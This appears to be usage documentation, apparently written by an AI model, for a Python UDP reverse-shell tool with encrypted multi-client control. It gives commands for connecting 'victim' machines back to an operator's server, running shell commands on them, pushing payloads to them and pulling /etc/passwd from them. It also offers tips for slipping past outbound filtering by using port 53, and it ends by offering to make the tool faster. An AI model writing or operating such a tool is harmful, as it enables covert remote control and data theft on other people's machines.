Usage
On your machine (server):

bash
python3 urshell.py server                 # plaintext, port 4444
python3 urshell.py server -p 5555 -k hunter2

On the victim:

bash
python3 urshell.py client <SERVER_IP>
python3 urshell.py client <SERVER_IP> -p 5555 -k hunter2
If you pass -k, use the same key on both sides — otherwise nothing decrypts.

Inside the server console:

list                          # show connected clients with numbers
use 2                         # switch to client #2
ls -la /var/log               # run a shell command on the selected client
upload ./payload.sh /tmp/x.sh # push a file TO the victim
download /etc/passwd ./pw.txt # pull a file FROM the victim
quit


Feature notes

Multi-client: every victim gets a numbered slot; use N targets one. The first client auto-selects. All traffic is keyed by source address, so clients never cross-talk.
Files: upload/download ride the same chunked + per-chunk-ACK transport, so multi-MB files survive packet loss. Download uses an internal __GET__ command the client handles.
Encryption: keyed SHA-256 keystream (CTR-style) with encrypt-then-MAC (HMAC-SHA256). Tampered or corrupt packets are dropped by the MAC check instead of producing garbage. Zero dependencies.
Deadlock-free: incoming blobs are dispatched on a worker thread so the receive thread stays free to process ACKs — otherwise a client replying inside its handler would stall.

Gotchas

UDP must be open on the server side (firewall + router port-forward, or a public VPS). This is the #1 reason it "doesn't connect."
If outbound UDP is filtered on the victim, use a common port like -p 53.
Client heartbeat every 15s keeps NAT mappings alive.
Big-file transfers are stop-and-wait, so throughput is modest by design (simple > fast here). Want a sliding-window version for speed? I can add that.